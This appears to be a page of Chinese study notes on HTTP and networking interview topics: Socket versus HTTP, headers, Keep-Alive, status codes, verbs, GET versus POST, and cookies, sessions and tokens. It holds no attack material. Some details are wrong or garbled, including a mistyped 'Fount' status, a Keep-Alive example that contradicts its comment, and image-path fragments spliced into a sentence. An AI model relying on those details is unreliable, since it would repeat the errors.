<img src="/rat-summ/assets/img/19-27-33.8f11b6ee.jpg" alt=""></p> <p><strong>两类型比较</strong> <img src="/rat-summ/assets/img/19-26-49.4470a987.jpg" alt=""></p> <h4 id="socket-与-http-对比"><a href="#socket-与-http-对比" class="header-anchor">#</a> Socket 与 Http 对比</h4> <ul><li><code>Socket</code>属于传输层，因为 <code>TCP / IP</code>协议属于传输层，<strong>解决的是数据如何在网络中传输的问题</strong></li> <li><code>HTTP</code>协议 属于 应用层，<strong>解决的是如何包装数据</strong></li></ul> <p>由于二者不属于同一层面，所以本来是没有可比性的。但随着发展，默认的Http里封装了下面几层的使用，所以才会出现<code>Socket</code> &amp; <code>HTTP</code>协议的对比：（主要是工作方式的不同）：</p> <ul><li><p><code>Socket</code>：采用 <strong>服务器主动发送数据</strong> 的方式</p> <ol><li>即建立网络连接后，服务器可主动发送消息给客户端，而不需要由客户端向服务器发送请求</li> <li>可理解为：<strong>是服务器端有需要才进行通信</strong></li></ol></li> <li><p><code>Http</code>：采用 <strong>请求—响应</strong> 方式。</p> <ol><li>即建立网络连接后，当 客户端 向 服务器 发送请求后，服务器端才能向客户端返回数据。</li> <li>可理解为：<strong>是客户端有需要才进行通信</strong></li></ol></li></ul> <h4 id="实践-3"><a href="#实践-3" class="header-anchor">#</a> 实践</h4> <p><strong>socket模式下tcp/udp通讯：应用于iot中的etag项目</strong> <img src="/rat-summ/assets/img/19-36-45.ea124437.jpg" alt=""></p> <h2 id="http-10题"><a href="#http-10题" class="header-anchor">#</a> http[10题]</h2> <h3 id="_1-报文结构"><a href="#_1-报文结构" class="header-anchor">#</a> 1:报文结构</h3> <h4 id="报文格式"><a href="#报文格式" class="header-anchor">#</a> 报文格式</h4> <p><code>HTTP</code>的请求报文由 <strong>请求行、请求头 &amp; 请求体</strong> 组成，如下图
<img src="/rat-summ/assets/img/18-35-16.f89fe5e6.jpg" alt=""></p> <p><img src="/rat-summ/assets/img/12-19-40.7a58a7c1.jpg" alt="img"></p> <h4 id="请求响应头说明"><a href="#请求响应头说明" class="header-anchor">#</a> 请求响应头说明</h4> <p><strong>常用请求头：1.请求和响应报文的通用Header; 2.常用的响应Header;</strong> <img src="/rat-summ/assets/img/21-47-37.e654a3f6.jpg" alt="img"></p> <h5 id="cookie"><a href="#cookie" class="header-anchor">#</a> Cookie</h5> <p><strong>Set-Cookie/Cookie</strong>用户第一次访问服务器的时候，服务器会写入身份标识，下次再请求的时候会携带 cookie 。通过Cookie可以实现有状态的会话</p> <h5 id="管线化【要点】"><a href="#管线化【要点】" class="header-anchor">#</a> <strong>管线化</strong>【要点】</h5> <p>如果值创建一条 TCP 连接来进行数据的收发，就会变成 &quot;串行&quot; 模式，如果某个请求过慢就会发生阻塞问题。 <strong>Head-of-line blocking</strong>， HTTP/1.1中采用了管线化的方式，对一个域名同时发起多个长连接实现并发。 <strong>默认 chrome 为6个。<code>同一个域名有限制，那么我就多开几个域名 域名分片</code></strong></p> <h5 id="keep-alive"><a href="#keep-alive" class="header-anchor">#</a> Keep-Alive</h5> <p><strong>要点</strong></p> <ul><li>HTTP Keep-Alive 简单说就是<strong>保持当前的TCP连接，避免了重新建立连接</strong>。</li> <li>HTTP 长连接不可能一直保持; 例如 <code>Keep-Alive: timeout=5, max=100</code>，表示这个TCP通道可以保持5秒，max=100，表示这个长连接最多接收100次请求就断开。</li></ul> <p><strong>作用</strong></p> <p>在 <code>http 1.1</code> 中，在响应头中<strong>设置 <code>keep-alive</code> 可以在一个 TCP 连接上发送多个 http 请求</strong></p> <ol><li>避免了<strong>重开 TCP 连接的开销</strong>; <strong>刷新时重新建立 SSL 连接的开销</strong></li> <li>避免了QPS过大时，服务器的连接数过大;</li> <li>解决无连接和无状态;
<ul><li><strong>无连接</strong>：可以<strong>通过自身属性 Keep-Alive</strong>。</li> <li><strong>无状态</strong>：HTTP 协议本身无法解决这个状态，<strong>只有通过 cookie 和 session 将状态做贮存</strong>，常见的场景是登录状态保持；</li></ul></li></ol> <p>在服务器端使用响应头开启 <code>keep-alive</code>;  但是，keep-alive并不是免费的午餐,长时间的tcp连接容易导致系统资源无效占用。配置不当的keep-alive，有时比重复利用连接带来的损失还更大。所以，<strong>正确地设置keep-alive timeout时间非常重要。</strong></p> <div class="language-http line-numbers-mode"><pre class="language-http"><code><span class="token header-name keyword">Connection:</span> Keep-Alive
<span class="token header-name keyword">Keep-Alive:</span> timeout=5, max=1000 
#表示这个TCP通道可以保持5秒，max=100，表示这个长连接最多接收100次请求就断开
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><blockquote><h4 id="既然-http-是无状态协议-那它是如何保持登录状态"><a href="#既然-http-是无状态协议-那它是如何保持登录状态" class="header-anchor">#</a> 既然 http 是无状态协议，那它是如何保持登录状态</h4></blockquote> <p>通过 cookie 或者 Authorization header 来传递凭证，在服务端进行认证</p> <blockquote><h4 id="如何从-http-的报文中得知该服务使用的技术栈"><a href="#如何从-http-的报文中得知该服务使用的技术栈" class="header-anchor">#</a> 如何从 http 的报文中得知该服务使用的技术栈</h4></blockquote> <p>一般有两个 response header，有时服务端为了隐蔽自己真实的技术栈会隐蔽这两个字段</p> <ul><li><code>X-Powerd-By</code></li> <li><code>Server</code></li></ul> <p>可在nginx中关闭屏蔽这几个字段；</p> <h5 id="content-type"><a href="#content-type" class="header-anchor">#</a> content-type</h5> <p>如果 content-type 为 application/<strong>octet-stream</strong>， 代表二进制流，<strong>一般用以下载文件</strong>；</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token string">'content-type'</span><span class="token operator">:</span> <span class="token string">'application/x-www-form-urlencoded'</span><span class="token comment">// Is set automatically</span>
<span class="token string">'content-type'</span><span class="token operator">:</span> <span class="token string">'multipart/form-data'</span> 

<span class="token comment">// res.setHeader('Content-Type', 'text/plain');</span>
res<span class="token punctuation">.</span><span class="token function">setHeader</span><span class="token punctuation">(</span><span class="token string">'Content-Type'</span><span class="token punctuation">,</span> <span class="token string">'text/html'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br></div></div><h5 id="编码格式"><a href="#编码格式" class="header-anchor">#</a> 编码格式</h5> <p>服务端返回压缩包的时候告诉浏览器一声，这其实是一个gz压缩包，浏览器你使用前先解压一下。而这个通知就是我们之前判断是否开启gzip压缩的请求头字段，Response Headers里的 <strong>content-encoding: gzip</strong>。<strong>req.headers['accept-encoding']  // gzip deflate</strong></p> <p><img src="/rat-summ/assets/img/21-50-24.08d6d4b4.jpg" alt="img"> <img src="/rat-summ/assets/img/21-50-48.69b9f234.jpg" alt="img"></p> <h3 id="_2-http版本的比较【要点】"><a href="#_2-http版本的比较【要点】" class="header-anchor">#</a> 2:http版本的比较【要点】</h3> <table><thead><tr><th>版本</th> <th>内容</th></tr></thead> <tbody><tr><td>http0.9</td> <td>只允许客户端发送 GET 这一种请求;且不支持请求头,协议只支持纯文本;无状态性,每个访问独立处理,完成断开;无状态码</td></tr> <tr><td>http1.0</td> <td>解决 0.9 的缺点,<strong>增加 expires和 If-modify-since(last-modify) 缓存属性</strong></td></tr> <tr><td>http1.x</td> <td><strong>增加<code>keep-alive</code>, cache-control 和 If-none-match(etag)缓存属性</strong></td></tr> <tr><td>http2.0</td> <td><strong>采用二进制格式传输;多路复用;报头压缩;服务器推送</strong></td></tr> <tr><td>http3.0</td> <td>采用 QUIC 协议,<strong>自定义连接机制</strong>;自定义<strong>重传机制</strong>;<strong>无阻塞的多路复用</strong></td></tr></tbody></table> <p><strong>名称解释</strong> CEEL ==&gt;EL+CE</p> <table><thead><tr><th style="text-align:left;">属性名</th> <th>含义</th></tr></thead> <tbody><tr><td style="text-align:left;"><strong>Expires</strong></td> <td><strong>缓存过期时间,b 和 s 时间做对比</strong></td></tr> <tr><td style="text-align:left;"><strong>Last-Modified</strong></td> <td><strong>值为时间,s 返回的最后修改时间</strong></td></tr> <tr><td style="text-align:left;">Cache-Control</td> <td>在1.1 引入的方法,指定请求和响应遵循的缓存机制;值有:public(b 和 s 都缓存),private(b 缓存),no-cache(不缓存),no-store(不缓存),max-age(缓存时间,s 为单位),min-fresh(最小更新时间),max-age=3600</td></tr> <tr><td style="text-align:left;">Etag</td> <td>上次请求响应头返回的 etag 值响应头增加 Cache-Control，表示所有的缓存机制是否可以缓存及哪种类型 etag 返回的哈希值,第二次请求头携带去和服务器值对比</td></tr></tbody></table> <p><strong>注意</strong>: Cache-Control 的 <strong>max-age 返回是缓存的相对时间</strong>; Cache-Control 优先级比 expires 高; 缺点：不能第一时间拿到最新修改文件;</p> <h3 id="_3-http状态码【要点】"><a href="#_3-http状态码【要点】" class="header-anchor">#</a> 3:HTTP状态码【要点】</h3> <h4 id="比较分类"><a href="#比较分类" class="header-anchor">#</a> 比较分类</h4> <table><thead><tr><th>序列</th> <th>详情</th></tr></thead> <tbody><tr><td>1XX(通知)</td> <td>代表请求已被接受，需要继续处理。这类响应是临时响应，只包含状态行和某些可选的响应头信息，并以空行结束。<strong>101 Switching Protocols</strong></td></tr> <tr><td>2XX(成功)</td> <td>200(成功)、<strong>201(服务器创建)</strong>、202(服务器接收未处理)、203(非授权信息)、<strong>204(未返回内容)</strong>、205(重置内容)、<strong>206(部分内容)</strong></td></tr> <tr><td>3XX(重定向)</td> <td><strong>301(永久移动)、302(临时移动)</strong>、303(查看其他位置)、<strong>304(未修改)</strong>、305(使用代理)、<strong>307(临时重定向)</strong></td></tr> <tr><td>4XX(客户端错误)</td> <td>400(错误请求)、401(未授权)、403(禁止)、404(未找到)、405(方法禁用)、406(不接受)、407（需要代理授权）</td></tr> <tr><td>5XX(服务器错误)</td> <td>500(服务器异常)、501（尚未实施）、<strong>502（错误网关）</strong>、503（服务不可用）、<strong>504（网关超时）</strong>、505（HTTP 版本不受支持）</td></tr></tbody></table> <h4 id="比较总括"><a href="#比较总括" class="header-anchor">#</a> <strong>比较总括</strong></h4> <ul><li>1xx：<strong>指示信息</strong>–表示请求已接收，继续处理。</li> <li>2xx：<strong>指示成功</strong>–表示请求已被成功接收、理解、接受。</li> <li>3xx：<strong>指示重定向</strong>–要完成请求必须进行更进一步的操作。</li> <li>4xx：<strong>指示客户端错误</strong>–请求有语法错误或请求无法实现。</li> <li>5xx：<strong>指示服务器端错误</strong>–服务器未能实现合法的请求。</li></ul> <h4 id="特殊状态码"><a href="#特殊状态码" class="header-anchor">#</a> 特殊状态码</h4> <ul><li>301:请求的资源被永久转移到其他地方（重定向）;</li> <li>302:临时转移；</li> <li>501, 505(koa中有处理)</li> <li>206:range范围请求； range范围请求【206】;显示一个请求文件的多少行
模拟: `curl -r 0-10 http://127.0.0.1:9527/LICENSE (10行)</li> <li>304:缓存(新鲜度)
Request Headers跟 Response Headers 中的 Last-Modified/ETag一样，才确保是新鲜的304；</li></ul> <blockquote><h4 id="http-状态码中-301-302和307有什么区别"><a href="#http-状态码中-301-302和307有什么区别" class="header-anchor">#</a> http 状态码中 301，302和307有什么区别</h4></blockquote> <ul><li><p>301，Moved Permanently。<strong>永久重定向，该操作比较危险，需要谨慎操作</strong>：如果设置了301，但是一段时间后又想取消，但是浏览器中已经有了缓存，还是会重定向。</p></li> <li><p>302，Fount。临时重定向，<strong>但是会在重定向的时候改变 method</strong>: 把 POST 改成 GET，于是有了 307</p></li> <li><p>307，Temporary Redirect。临时重定向，<strong>在重定向时不会改变 method</strong></p></li></ul> <blockquote><h4 id="http-状态码-502-和-504-有什么区别"><a href="#http-状态码-502-和-504-有什么区别" class="header-anchor">#</a> http 状态码 502 和 504 有什么区别</h4></blockquote> <ul><li>502 Bad Gateway The server was acting as a gateway or proxy and received an invalid response from the upstream server. <strong>收到了上游响应但无法解析</strong></li> <li>504 Gateway Timeout The server was acting as a gateway or proxy and did not receive a timely response from the upstream server. <strong>上游响应超时</strong>；</li></ul> <blockquote><h4 id="http-向-https-做重定向应该使用哪个状态码"><a href="#http-向-https-做重定向应该使用哪个状态码" class="header-anchor">#</a> http 向 https 做重定向应该使用哪个状态码</h4></blockquote> <p><strong>一般用作 <code>301</code> 的较为多，但是也有使用 <code>302</code>，如果开启了 <code>HSTS</code> 则会使用 <code>307</code></strong></p> <p>如知乎使用了 302，淘宝使用了 301；</p> <div class="language-http line-numbers-mode"><pre class="language-http"><code>$ curl --head www.zhihu.com
<span class="token response-status">HTTP/1.1 <span class="token property">302 Found</span></span>
<span class="token header-name keyword">Date:</span> Tue, 24 Dec 2019 00:13:54 GMT
<span class="token header-name keyword">Content-Length:</span> 22
<span class="token header-name keyword">Connection:</span> keep-alive
<span class="token header-name keyword">Server:</span> NWS_TCloud_IPV6
<span class="token header-name keyword">Location:</span> https://www.zhihu.com/
<span class="token header-name keyword">X-NWS-LOG-UUID:</span> 0e28d9a1-6aeb-42cd-9f6b-00bd6cf11500

$ curl --head www.taobao.com
<span class="token response-status">HTTP/1.1 <span class="token property">301 Moved Permanently</span></span>
<span class="token header-name keyword">Server:</span> Tengine
<span class="token header-name keyword">Date:</span> Tue, 24 Dec 2019 00:13:58 GMT
<span class="token header-name keyword">Content-Type:</span> text/html
<span class="token header-name keyword">Content-Length:</span> 278
<span class="token header-name keyword">Connection:</span> keep-alive
<span class="token header-name keyword">Location:</span> https://www.taobao.com/
<span class="token header-name keyword">Via:</span> cache20.cn1480[,0]
<span class="token header-name keyword">Timing-Allow-Origin:</span> *
<span class="token header-name keyword">EagleId:</span> 6f3f38a815771464380412555e
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br></div></div><h3 id="_4-http动词"><a href="#_4-http动词" class="header-anchor">#</a> 4:HTTP动词</h3> <h4 id="常用的动词"><a href="#常用的动词" class="header-anchor">#</a> 常用的动词</h4> <p>常用的HTTP动词有下面五个</p> <ul><li>GET（SELECT）：从服务器取出资源（一项或多项）。//200</li> <li>POST（CREATE）：在服务器新建一个资源。//201</li> <li>PUT（UPDATE）：在服务器更新资源（客户端<strong>提供改变后的完整资源</strong>）。//204</li> <li>PATCH（UPDATE）：在服务器更新资源（客户端<strong>提供改变的属性</strong>）。</li> <li>DELETE（DELETE）：从服务器删除资源。</li></ul> <p>总括：GET、POST、PUT、DELETE、HEAD、CONNECT、OPTIONS、TRACE;</p> <p><strong>常用的5+1种【CRUD操作+ H+P】</strong></p> <table><thead><tr><th>methods</th> <th>CRUD</th> <th>幂等</th> <th>缓存</th></tr></thead> <tbody><tr><td>GET 200</td> <td>Read</td> <td>✓</td> <td>✓</td></tr> <tr><td>POST 201</td> <td>Create</td> <td></td> <td></td></tr> <tr><td><strong>PUT</strong> 204</td> <td>Update/Replace</td> <td>✓</td> <td></td></tr> <tr><td><strong>PATCH</strong></td> <td>Update/Modify</td> <td></td> <td></td></tr> <tr><td>DELETE</td> <td>Delete</td> <td>✓</td> <td></td></tr></tbody></table> <h4 id="post-和-put-的区别"><a href="#post-和-put-的区别" class="header-anchor">#</a> POST 和 PUT 的区别</h4> <p>POST 是新建 (create) 资源, 非幂等, <strong>同一个请求如果重复 POST 会新建多个资源</strong>. PUT 是 Update/Replace, 幂等, 同一个 PUT 请求重复操作会得到同样的结果.</p> <h4 id="get和post区别"><a href="#get和post区别" class="header-anchor">#</a> get和post区别</h4> <table><thead><tr><th>请求方式</th> <th>GET</th> <th>POST</th></tr></thead> <tbody><tr><td>参数位置</td> <td>参数拼接到url的后面</td> <td>参数在请求体中</td></tr> <tr><td>参数大小</td> <td>受限于浏览器url大小，<strong>一般不超过32K</strong></td> <td>1G</td></tr> <tr><td>服务器数据接收</td> <td>接收1次</td> <td>根据数据大小，可分多次接收</td></tr> <tr><td>适用场景</td> <td>从服务器端获取数据</td> <td>向服务器提交数据</td></tr> <tr><td>安全性</td> <td>参数携带在url中，安全性低</td> <td>相对于GET请求，安全性更高</td></tr></tbody></table> <p>接触 RESTful 才意识到, 这两个东西最根本的差别是语义, 引申了看, <strong>协议 (protocol) 这种东西就是人与人之间协商的约定, 什么行为是什么作用都是&quot;约定&quot;好的</strong>, 而不是强制使用的, 非要把 GET 当 POST 这样不遵守约定的做法我们也爱莫能助. 简而言之, <strong>讨论这二者的区别最好从 RESTful 提倡的语义角度来讲_image/02.http协议相关_image/02.http协议相关比较符合当代程序员的逼格_image/02.http协议相关_image/02.http协议相关比较合理.</strong></p> <h4 id="get请求传参长度的误区"><a href="#get请求传参长度的误区" class="header-anchor">#</a> get请求传参长度的误区</h4> <p>误区：我们经常说get请求参数的大小存在限制，而post请求的参数大小是无限制的。</p> <p>强调下面几点:</p> <ul><li>HTTP 协议 未规定 GET 和POST的长度限制；</li> <li><strong>GET的最大长度显示是因为 浏览器和 web服务器限制了 URI的长度</strong>；</li> <li>不同的浏览器和WEB服务器，限制的最大长度不一样；</li> <li>要支持IE，则最大长度为2083byte，若只支持Chrome，则最大长度 8182byte；</li></ul> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token comment">//MAX_GET_URL_LENGTH: 2048,</span>
<span class="token keyword">var</span> <span class="token function-variable function">doGetAsPost</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">opt</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">var</span> delimiterPos <span class="token operator">=</span> opt<span class="token punctuation">.</span>url<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token string">'?'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">var</span> fieldsIndex <span class="token operator">=</span> opt<span class="token punctuation">.</span>url<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token string">'&amp;fields'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  opt<span class="token punctuation">.</span>type <span class="token operator">=</span> <span class="token string">&quot;POST&quot;</span><span class="token punctuation">;</span>
  opt<span class="token punctuation">.</span>headers<span class="token punctuation">[</span><span class="token string">&quot;X-Http-Method-Override&quot;</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">&quot;GET&quot;</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>delimiterPos <span class="token operator">!==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">var</span> query <span class="token operator">=</span> fieldsIndex <span class="token operator">!==</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token operator">?</span> opt<span class="token punctuation">.</span>url<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span>delimiterPos <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> fieldsIndex<span class="token punctuation">)</span> <span class="token operator">:</span> opt<span class="token punctuation">.</span>url<span class="token punctuation">.</span><span class="token function">substr</span><span class="token punctuation">(</span>delimiterPos <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    opt<span class="token punctuation">.</span>data <span class="token operator">=</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
      <span class="token string">&quot;RequestInfo&quot;</span><span class="token operator">:</span> <span class="token punctuation">{</span><span class="token string">&quot;query&quot;</span> <span class="token operator">:</span> query<span class="token punctuation">}</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>fieldsIndex <span class="token operator">!==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      opt<span class="token punctuation">.</span>url <span class="token operator">=</span> opt<span class="token punctuation">.</span>url<span class="token punctuation">.</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> delimiterPos<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'?'</span> <span class="token operator">+</span> opt<span class="token punctuation">.</span>url<span class="token punctuation">.</span><span class="token function">substr</span><span class="token punctuation">(</span>fieldsIndex <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'&amp;_='</span> <span class="token operator">+</span> App<span class="token punctuation">.</span><span class="token function">dateTime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
      opt<span class="token punctuation">.</span>url <span class="token operator">=</span> opt<span class="token punctuation">.</span>url<span class="token punctuation">.</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> delimiterPos<span class="token punctuation">)</span>  <span class="token operator">+</span> <span class="token string">'?_='</span> <span class="token operator">+</span> App<span class="token punctuation">.</span><span class="token function">dateTime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
    opt<span class="token punctuation">.</span>url <span class="token operator">+=</span> <span class="token string">'?_='</span> <span class="token operator">+</span> App<span class="token punctuation">.</span><span class="token function">dateTime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">return</span> opt<span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span>opt<span class="token punctuation">.</span>url <span class="token operator">&amp;&amp;</span> opt<span class="token punctuation">.</span>url<span class="token punctuation">.</span>length <span class="token operator">&gt;</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'MAX_GET_URL_LENGTH'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  opt <span class="token operator">=</span> <span class="token function">doGetAsPost</span><span class="token punctuation">(</span>opt<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br></div></div><h4 id="get和post在缓存方面的区别"><a href="#get和post在缓存方面的区别" class="header-anchor">#</a> get和post在缓存方面的区别</h4> <ul><li>get请求类似于查找的过程，用户获取数据，可以不用每次都与数据库连接，所以可以使用缓存。</li> <li>post不同，post做的一般是修改和删除的工作，所以必须与数据库交互，所以不能使用缓存。因此get请求适合于请求缓存。</li></ul> <h3 id="_5-完整的http的工作流程【要点】"><a href="#_5-完整的http的工作流程【要点】" class="header-anchor">#</a> 5:完整的HTTP的工作流程【要点】</h3> <h4 id="tcp-ip和dns与http的密切关系"><a href="#tcp-ip和dns与http的密切关系" class="header-anchor">#</a> TCP/IP和DNS与HTTP的密切关系</h4> <p><img src="/rat-summ/assets/img/21-31-01.29f20707.jpg" alt=""> <img src="/rat-summ/assets/img/21-26-05.d6ba463b.jpg" alt=""></p> <h4 id="从url输入到页面展现内部过程-8步"><a href="#从url输入到页面展现内部过程-8步" class="header-anchor">#</a> 从URL输入到页面展现内部过程(8步)</h4> <p><strong>总体流程</strong>：(八部曲)：谐音 <strong>【输缓域三,请响解四】</strong></p> <ol><li><p>浏览器的地址栏输入URL并按下回车；</p></li> <li><p>浏览器查找当前URL是否存在缓存，并比较缓存是否过期； 【重点】</p></li> <li><p>DNS 解析:  将域名解析成 IP 地址；</p></li> <li><p>根据IP建立TCP连接（三次握手）；</p></li> <li><p>发送 HTTP 请求；</p></li> <li><p>服务器处理请求，浏览器接收HTTP响应。</p></li> <li><p>浏览器通过渲染引擎将网页呈现在用户面前。</p> <ul><li>根据 HTML 解析出 DOM 树</li> <li>根据 CSS 解析生成 CSS 规则树</li> <li>结合 DOM 树和 CSS 规则树，生成渲染树</li> <li>根据渲染树计算每一个节点的信息</li> <li>根据计算好的信息绘制页面</li></ul></li> <li><p>断开TCP连接：TCP 四次挥手 ；</p></li></ol> <p><img src="/rat-summ/assets/img/21-24-24.63af08f8.jpg" alt="img"></p> <p><img src="/rat-summ/assets/img/21-23-50.b3070698.jpg" alt="img"></p> <h3 id="_6-cookie-session-token"><a href="#_6-cookie-session-token" class="header-anchor">#</a> 6:Cookie/Session/Token</h3> <h4 id="简介-2"><a href="#简介-2" class="header-anchor">#</a> 简介</h4> <ul><li><strong>session 是另一种记录服务器和客户端会话状态的机制</strong>；</li> <li><strong>session 是基于 cookie 实现的，session 存储在服务器端，sessionId 会被存储到客户端的cookie 中</strong>；</li></ul> <h4 id="cookie-与-session区别"><a href="#cookie-与-session区别" class="header-anchor">#</a> Cookie 与 Session区别</h4> <ul><li><strong>安全性：</strong> Session 比 Cookie 安全，Session 是存储在服务器端的，Cookie 是存储在客户端的。</li> <li><strong>存取值的类型不同</strong>：Cookie 只支持存字符串数据，想要设置其他类型的数据，需要将其转换成字符串，<strong>Session 可以存任意数据类型</strong>。</li> <li><strong>有效期不同：</strong> Cookie 可设置为长时间保持，比如我们经常使用的默认登录功能，Session 一般失效时间较短，客户端关闭（默认情况下）或者 Session 超时都会失效。</li> <li><strong>存储大小不同：</strong> 单个 Cookie 保存的数据不能超过 4K，Session 可存储数据远高于 Cookie，但是当访问量过多，会占用过多的服务器资源。</li></ul> <p><img src="/rat-summ/assets/img/10-56-12.b2424a4f.jpg" alt="img"> <img src="/rat-summ/assets/img/10-55-26.efabe1fc.jpg" alt="img"></p> <h4 id="cookie-与-token"><a href="#cookie-与-token" class="header-anchor">#</a> Cookie 与 Token</h4> <p><img src="/rat-summ/assets/img/image-20211101202131780.570f5cf1.png" alt="image-20211101202131780"> <img src="/rat-summ/assets/img/image-20211101202151157.1a57223f.png" alt="image-20211101202151157"></p> <blockquote><h4 id="那么在koa中我们需要做哪些事情"><a href="#那么在koa中我们需要做哪些事情" class="header-anchor">#</a> 那么在koa中我们需要做哪些事情？</h4></blockquote> <ul><li><strong>在生成token阶段</strong>：首先是验证账户，然后生成token令牌，传给前端。</li> <li><strong>在认证token阶段</strong>:  完成认证中间件的编写，对前端的访问做一层拦截，token认证过后才能访问后面的接口。</li></ul> <p>可以实现：</p> <ul><li><strong>授权登录</strong>:google登录(通过跳板登录,通过用户的帐号及密码获取到token，再跳板机中拿到token取获取google的用户信息)，</li> <li><strong>跳板机设置</strong>：确保可以翻墙；</li></ul> <h4 id="会话跟踪常用的方法"><a href="#会话跟踪常用的方法" class="header-anchor">#</a> 会话跟踪常用的方法</h4> <h5 id="url-重写"><a href="#url-重写" class="header-anchor">#</a> URL 重写</h5> <p>URL(统一资源定位符)是Web上特定页面的地址，URL重写的技术就是在URL结尾添加一个附加数据以标识该会话,把会话ID通过URL的信息传递过去，以便在服务器端进行识别不同的用户。</p> <h5 id="隐藏表单域"><a href="#隐藏表单域" class="header-anchor">#</a> 隐藏表单域</h5> <p>将会话ID添加到HTML表单元素中提交到服务器，此表单元素并不在客户端显示</p> <h5 id="cookie-2"><a href="#cookie-2" class="header-anchor">#</a> Cookie</h5> <p>Cookie 是Web 服务器发送给客户端的一小段信息，客户端请求时可以读取该信息发送到服务器端，进而进行用户的识别。对于客户端的每次请求，服务器都会将 Cookie 发送到客户端,在客户端可以进行保存,以便下次使用。</p> <p>客户端可以采用两种方式来保存这个 Cookie 对象，一种方式是保存在客户端内存中，称为临时 Cookie，浏览器关闭后这个 Cookie 对象将消失。另外一种方式是保存在客户机的磁盘上，称为永久 Cookie。以后客户端只要访问该网站，就会将这个 Cookie 再次发送到服务器上，前提是这个 Cookie 在有效期内，这样就实现了对客户的跟踪。Cookie 是可以被客户端禁用的。</p> <h5 id="session"><a href="#session" class="header-anchor">#</a> Session</h5> <p>每一个用户都有一个不同的 session，各个用户之间是不能共享的，是每个用户所独享的，在 session 中可以存放信息。</p> <p><strong>在服务器端会创建一个 session 对象，产生一个 sessionID 来标识这个 session 对象，然后将这个 sessionID 放入到 Cookie 中发送到客户端</strong>，下一次访问时，sessionID 会发送到服务器，在服务器端进行识别不同的用户。</p> <p><strong>Session 的实现依赖于 Cookie，如果 Cookie 被禁用，那么 session 也将失效。</strong></p> <h3 id="_7-缓存"><a href="#_7-缓存" class="header-anchor">#</a> 7:缓存</h3> <h4 id="缓存的优点"><a href="#缓存的优点" class="header-anchor">#</a> 缓存的优点</h4> <blockquote><p>减少网络传输的损耗以及降低服务器压力。</p></blockquote> <ol><li>减少了冗余的数据传递，<strong>节省宽带流量</strong></li> <li>减少了<strong>服务器的负担，大大提高了网站性能</strong></li> 